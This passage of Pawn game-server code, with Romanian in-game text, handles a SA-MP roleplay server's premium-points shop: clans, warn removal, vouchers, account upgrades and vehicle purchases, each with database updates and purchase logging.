						case 13: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti stergi faction history-ul? (300 puncte premium)", "Ok", "Back");
						case 14: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un Rainbow ticket? (300 puncte premium)", "Ok", "Back");
						case 15: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un VIP ticket? (300 puncte premium)", "Ok", "Back");
						case 16: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un 1x mythic Voucher (250 PP)? (260 puncte premium)", "Ok", "Back");
						case 17: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi un 1x Millionaries Voucher (1000 PP)? (1030 puncte premium)", "Ok", "Back");
						case 18: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa-ti achizitionezi un Custom Number (only legends)? (200 puncte premium)", "Ok", "Back");
					}	
				}
				case 2: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Buy vehicle", "Esti sigur ca vrei sa cumperi acest vehicul?", "Buy", "Exit");			
				case 3: {
					switch(listitem) {
					    case 0: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Buy Packet", "INFO: Daca deti unul dintre aceste produse nu le vei primi!\n\nCe primesc dupa ce cumpar acest pachet? (1000 Premium Points)\n> VIP Account\n> Premium Account\n> iPhone\n> +$150,000,000", "Buy", "Exit");
					   	case 1: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Buy Packet", "INFO: Daca deti unul dintre aceste produse nu le vei primi!\n\nCe primesc dupa ce cumpar acest pachet? (850 Premium Points)\n> 1x Legendary Voucher\n> 2x Epic Voucher\n> 3x Rare Voucher", "Buy", "Exit");
					    case 2: {
					    	if(PlayerInfo[playerid][pSlot] >= MAX_PLAYER_VEHICLE-(PlayerInfo[playerid][pPremiumAccount]?0:2)-(PlayerInfo[playerid][pVip]!=2?5:0)-(!PlayerInfo[playerid][pReborn]?5:0)) return SendClientMessage(playerid, -1, "Ai numarul maxim de masini personale!");
					    	ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Buy Packet", "INFO: Daca deti unul dintre aceste produse nu le vei primi!\n\nCe primesc dupa ce cumpar acest pachet? (1000 Premium Points)\n> Hotring Racer (random)\n4x Hidden Colors\n1x Slot", "Buy", "Exit");
					    }
					}			
				}
				case 5: {
					switch(listitem) {
						case 0: {
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Account upgrade", "Esti sigur ca vrei sa-ti upgradezi contul 'reborn'? (500 pp & 500 rp & 3000bp)\n\nBenefici:\n\
							- Deblochezi 5 sloturi pentru vehicule.\n- Acces la /find fara a avea jobul detectiv.\n- Acces la comenzile /messages, /missedcalls.\n\
							- TAG deasupra capului.\n- beneficii referral din nou.\n- (/collect) de 2 ori pe zi\n- vei putea spawna 4 vehicule simultane.\n\
							- 40l in canistra in loc de 20l", "Buy", "Exit");
						}
						case 1: {
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Account upgrade", "Esti sigur ca vrei sa-ti upgradezi contul 'reborn 2'? (500 pp & 400 rp & 5000bp)\n\nBenefici:\n\
							- /getgift oriunde\n- deblochezi 5 sloturi pentru vehicule\n- 5 pagini de skinuri\n\
							- beneficii referal primite din nou la fiecare 5 nivele\n- in /id se va vedea si numarul de telefon\n- /vr oriunde\n- fara taxa la /withdraw (ATM)\n\
							- beneficii referral x2", "Buy", "Exit");
						}
						case 2: {
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Account upgrade", "Esti sigur ca vrei sa-ti upgradezi contul 'reborn 3'? (500 pp & 300 rp & 8000bp)\n\nBenefici:\n\
							- beneficiile de la reborn-urile anterioare\n- deblochezi 5 sloturi pentru vehicule\n- beneficii referral x3", "Buy", "Exit");
						}
						case 3: {
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Account upgrade", "Esti sigur ca vrei sa-ti upgradezi contul 'reborn 4'? (500 pp & 200 rp & 10000bp)\n\nBenefici:\n\
							- beneficiile de la reborn-urile anterioare\n- deblochezi 5 sloturi pentru vehicule\n- beneficii referral x4", "Buy", "Exit");
						}
						case 4: {
							ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Account upgrade", "Esti sigur ca vrei sa-ti upgradezi contul 'reborn 5'? (500 pp & 100 rp & 15000bp)\n\nBenefici:\n\
							- beneficiile de la reborn-urile anterioare\n- deblochezi 5 sloturi pentru vehicule\n- beneficii referral x5", "Buy", "Exit");
						}
						case 5: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti actualizezi contul in unul de tip premium? (150 puncte premium)\n\nBeneficii\n- Interes 0.2\n- +2 sloturi vehicule personale\n - Acces la /pcolor\n- +50 job boost\n- Acces chat premium (/pc)", "Ok", "Back");
						case 6: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi Premium Account Plus? (2 miliards & 2000 BPoints)\n\nBeneficii:\n- /flip (30 min deelay)\n- limita credit marita\n- dobanda banca marita\n- acces la /mylp\n- grad diferit in (/pc)\n- +10 joob bost\n- culori noi in /pcolor", "Ok", "Back");
						case 7: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti actualizezi contul in unul de tip VIP? (800 puncte premium)\n\nBeneficii\n- Acces la (/nos, /vipwheels, /vc, /sett, /setw, /reply)\n- Backpack (poti lua 2 pesti si face 2 ture la farm)", "Ok", "Back");
						case 8: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi VIP Plus (ai nevoie de cont vip)? (500 puncte premium).\n\nBeneficii\n- /call [id], /sms [id]\n- numar din 3 cifre\n/v(ehicle)r(epair) / 10 min - $50,000\n/ad timp injumatatit\nPana la 20 sloturi", "Ok", "Back");
						case 9: ShowPlayerDialog(playerid, DIALOG_SHOP1, DIALOG_STYLE_MSGBOX, "Shop: Confirm", "Esti sigur ca vrei sa iti achizitionezi Legend (ai nevoie de cont vip plus)? (1337 puncte premium).\nBeneficii:\n- /ad oriunde\n- /legendcolor\n- tag deasuprea capului\n- number custom\n- /turn off messages\n- 4 pag. skins\n- timp injumatatit /vr, teleport vehicle\n- limita rob 30, giftpoints 3000\n- 8 vehicule spawnate\n- /lc", "Ok", "Back");
					}		
				}
			}
			SelectedItem[playerid] = listitem;
		}
		case DIALOG_SHOP1: {
			if(!response) {
				ShopType[playerid] = 0;
				ShowShop(playerid);
				return true;
			}
		    switch(ShopType[playerid]) {
		    	case 1: {
				    switch(SelectedItem[playerid]) {
				        case 0: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
				            if(PlayerInfo[playerid][pClanRank] == 7) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja un clan.");
				            if(PlayerInfo[playerid][pClan]) return SendClientMessage(playerid, COLOR_WHITE, "Faci parte dintr-un clan deja.");
				            sSlot[playerid] = 30;
							ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti creezi un clan cu 30 locuri disponibile.\nTot ce trebuie sa faci in acest moment,\
							este sa-ti alegi numele clanului.\nNumele clanului trebuie sa contina intre 3 si 10 caractere.", "Ok", "Back");
							format(gString, 128, "%s si-a achizitionat un clan pentru 300 Premium Points.", GetName(playerid));
							InsertLog(playerid, gString, LOG_SHOP);				   
					    }
					    case 1: {
					    	if(PlayerInfo[playerid][pPremiumPoints] < 30) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					    	if(PlayerInfo[playerid][pFpunish]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai Faction punish.");
							PlayerInfo[playerid][pPremiumPoints] -= 30;
							PlayerInfo[playerid][pFpunish] = PlayerInfo[playerid][pFpunish]-10<=0?0:PlayerInfo[playerid][pFpunish]-10;	
							UpdateVar(playerid, "FPunish", PlayerInfo[playerid][pFpunish]);
							SendClientMessage(playerid, -1, "{47A033}(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat 10 Faction Punish. (-30 premium points)");
							InsertLog(playerid, string, LOG_SHOP);	
						}
						case 2: {
							if(PlayerInfo[playerid][pPremiumPoints] < 200) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Shop: Change Nickname", "Tot ce trebuie sa faci in acest moment este sa-ti alegi un nume ce nu-i apartine unui jucator. (3-24 caractere)", "Next", "Back");
						}
						case 3: {
							if(PlayerInfo[playerid][pPremiumPoints] < 40) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							PlayerInfo[playerid][pHidden] ++;
							UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
							PlayerInfo[playerid][pPremiumPoints] -= 40;
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat o culoare hidden. (-40 premium points)");
							format(string, sizeof(string), "%s si-a achizitionat o culoare hidden pentru 40 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);	
						}
						case 4: {
							if(PlayerInfo[playerid][pPremiumPoints] < 40) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(PlayerInfo[playerid][pSlot] >= MAX_PLAYER_VEHICLE-(PlayerInfo[playerid][pPremiumAccount]?0:2)-(PlayerInfo[playerid][pVip]!=2?5:0)-(!PlayerInfo[playerid][pReborn]?5:0)) return SendClientMessage(playerid, -1, "Ai numarul maxim de sloturi!");
							PlayerInfo[playerid][pSlot] ++;
							PlayerInfo[playerid][pPremiumPoints] -= 40; 
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							UpdateSlots(playerid);
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un slot (vehicul). (-40 premium points)");
							format(string, sizeof(string), "%s si-a achizitionat un slot (vehicul) pentru 40 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);						
							finishAchievement(playerid, 23);
						}
						case 5: {
							if(PlayerInfo[playerid][pPremiumPoints] < 150) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(!PlayerInfo[playerid][pWarns]) return SendClientMessage(playerid, COLOR_GREY, "Nu ai warn-uri.");
							PlayerInfo[playerid][pWarns] -= 1;
							UpdateVar(playerid, "Warnings", PlayerInfo[playerid][pWarns]);
							PlayerInfo[playerid][pPremiumPoints] -= 150;
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-a fost sters un warn. (-150 premium points)");
							format(string, sizeof(string), "%s si-a sters un Warn pentru 150 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);					
						}		
						case 6: {
							if(PlayerInfo[playerid][pPremiumPoints] < 55) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(PlayerInfo[playerid][pMP3] == 1) return SendClientMessage(playerid,COLOR_WHITE, "Ai deja un radio.");
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un MP3. (-40 premium points)");
							UpdateVar(playerid, "Radio2", ++PlayerInfo[playerid][pMP3]);
							PlayerInfo[playerid][pPremiumPoints] -= 55;
							format(string, sizeof(string), "%s si-a achizitionat un MP3 pentru 55 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);					
						}
						case 7: {
							if(PlayerInfo[playerid][pPremiumPoints] < 100) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							ShowPlayerDialog(playerid, DIALOG_IPHONE, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti achizitionezi un iPhone.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 4 cifre.", "Ok", "Back");							
						}
						case 8: {
							if(PlayerInfo[playerid][pPremiumPoints] < 55) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							PlayerInfo[playerid][pPremiumPoints] -= 55;
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);			
							HouseInfo[PlayerInfo[playerid][pHouse]][hRadio] = 0;
							mysql_format(SQL, gQuery, 128, "UPDATE `houses` SET `Radio`='1' WHERE `ID`='%d'", PlayerInfo[playerid][pHouse]);
							mysql_tquery(SQL, gQuery);
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Acum poti pune radio in casa ta! Foloseste comanda /hradio pentru a pune. (-55 premium points)");
							format(string, sizeof(string), "%s si-a achizitionat un radio (casa) pentru 55 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);				
						}
						case 9: {
							if(PlayerInfo[playerid][pPremiumPoints] < 55) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							PlayerInfo[playerid][pPremiumPoints] -= 55;
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							if(BizzInfo[PlayerInfo[playerid][pBizz]][bStatic] == 1) return SendClientMessage(playerid, -1, "Nu poti pune radio in aceasta afacere.");
							BizzInfo[PlayerInfo[playerid][pBizz]][bRadio] = 0;
							mysql_format(SQL, gQuery, 128, "UPDATE `bizz` SET `Radio`='1' WHERE `ID`='%d'", PlayerInfo[playerid][pBizz]);
							mysql_tquery(SQL, gQuery);
							SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Acum poti pune radio in afacerea ta! Foloseste comanda /bradio pentru a pune. (-55 premium points)");
							format(string, sizeof(string), "%s si-a achizitionat un radio (bizz) pentru 55 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);						
						}	
						case 10: {
							if(PlayerInfo[playerid][pPremiumPoints] < 55) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 55;
					        PlayerInfo[playerid][pVoucher][0] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un Rare Voucher (50 PP). (-55 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Rare Voucher pentru 55 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 11: {
							if(PlayerInfo[playerid][pPremiumPoints] < 110) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 110;
					        PlayerInfo[playerid][pVoucher][1] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un Epic Voucher (100 PP). (-110 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Epic Voucher pentru 110 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 12: {
							if(PlayerInfo[playerid][pPremiumPoints] < 525) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 525;
					        PlayerInfo[playerid][pVoucher][2] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un Legendary Voucher (500 PP). (-525 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Legendary Voucher pentru 525 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 13: {
							if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 300;
					      	gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 128, "DELETE FROM `faction_logs` WHERE `player` = '%i'", PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai sters faction history. (-300 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Clear faction history pentru 300 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 14: {
							if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 300;
					        PlayerInfo[playerid][pTickets][0] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un Rainbow Ticket. (-300 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Rainbow Ticket pentru 300 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_tickete(playerid);
						}
						case 15: {
							if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 300;
					        PlayerInfo[playerid][pTickets][1] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un VIP Ticket. (-300 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un VIP Ticket pentru 300 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_tickete(playerid);
						}
						case 16: {
							if(PlayerInfo[playerid][pPremiumPoints] < 260) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 260;
					        PlayerInfo[playerid][pVoucher][3] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un mythic Voucher (250 PP). (-260 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un mythic Voucher pentru 260 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 17: {
							if(PlayerInfo[playerid][pPremiumPoints] < 1030) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
					        PlayerInfo[playerid][pPremiumPoints] -= 1030;
					        PlayerInfo[playerid][pVoucher][4] ++;
					        SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! ti-ai cumparat un Millionaries Voucher (1000 PP). (-1030 premium points)");
					        format(string, sizeof(string), "%s si-a achizitionat un Millionaries Voucher pentru 1030 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
						}
						case 18: {
							if(PlayerInfo[playerid][pPremiumPoints] < 200) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(PlayerInfo[playerid][pVip] != 3) return SendClientMessage(playerid, -1, "EROARE: Ai nevoie de cont LEGEND pentru a putea face asta!");
							if(strcmp(PlayerInfo[playerid][pPhone], "In Process", true) == 0) {
								SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un numar setat, foloseste '/requestnumber' pentru a seta gratis un numar!");
								return true;
							}
							//if(sscanf(PlayerInfo[playerid][pPhone], "{i}")) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un numar setat, foloseste '/requestnumber' pentru a seta gratis un numar!");
							ShowPlayerDialog(playerid, DIALOG_SHOP_CNUMBER, DIALOG_STYLE_INPUT, "Shop: Custom Number", "Tot ce trebuie sa faci in acest moment este sa-ti alegi un numar custom. (3-11 caractere)", "Next", "Back");
						}
					}
					UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
				}
				case 2: {
					switch(SelectedItem[playerid]) {
				        case 0: {
				        	if(!ServerStock[0]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				            if(PlayerInfo[playerid][pPremiumPoints] < 2500) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Infernus [PREMIUM]. (-2500 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 2500;
				            GiveVehicle(playerid, 411, true);
							format(string, sizeof(string), "%s si-a achizitionat un Infernus Premium pentru 2500 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							ServerStock[0] --;
				        }
				   		case 1: {
		              		if(PlayerInfo[playerid][pPremiumPoints] < 400) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
		              		if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Hotring Racer A. (-400 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 400;
				            GiveVehicle(playerid, 502);
							format(string, sizeof(string), "%s si-a achizitionat un Hotring Racer A pentru 400 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				        case 2: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 400) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Hotring Racer B. (-400 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 400;
				            GiveVehicle(playerid, 503);
							format(string, sizeof(string), "%s si-a achizitionat un Hotring Racer B pentru 400 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				        case 3: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 400) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Hotring Racer C (-400 premium points).");
				            PlayerInfo[playerid][pPremiumPoints] -= 400;
				            GiveVehicle(playerid, 494);
							format(string, sizeof(string), "%s si-a achizitionat un Hotring Racer C pentru 5400 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				    	case 4: {
				    		if(PlayerInfo[playerid][pPremiumPoints] < 450) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Streatch. (-450 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 450;
				            GiveVehicle(playerid, 409);
							format(string, sizeof(string), "%s si-a achizitionat un Streatch pentru 5450 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				        case 5: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Spawrrow. (-300 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 300;
				            GiveVehicle(playerid, 447);
							format(string, sizeof(string), "%s si-a achizitionat un Spawrrow pentru 300 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				        case 6: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 500) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Maverick. (-500 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 500;
				            GiveVehicle(playerid, 487);
							format(string, sizeof(string), "%s si-a achizitionat un Maverick pentru 500 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				       	case 7: {
				       		if(PlayerInfo[playerid][pPremiumPoints] < 800) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Shamal. (-800 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 800;
				            GiveVehicle(playerid, 519);
							format(string, sizeof(string), "%s si-a achizitionat un Shamal pentru 800 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
				        }
				    	case 8: {
				    		if(!ServerStock[1]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				    		if(PlayerInfo[playerid][pPremiumPoints] < 10000) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Monster. (-1000 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 10000; ServerStock[1]--;
				            GiveVehicle(playerid, 444);
							format(string, sizeof(string), "%s si-a achizitionat un Monster pentru 10000 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
						}
						case 9: {
				    		if(!ServerStock[2]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				    		if(PlayerInfo[playerid][pPremiumPoints] < 1500) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un NRG [PREMIUM]. (-1500 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 1500; ServerStock[2]--;
				            GiveVehicle(playerid, 522, true);
							format(string, sizeof(string), "%s si-a achizitionat un NRG Premium pentru 1500 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
						}
						case 10: {
				    		if(!ServerStock[3]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				    		if(PlayerInfo[playerid][pPremiumPoints] < 2000) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
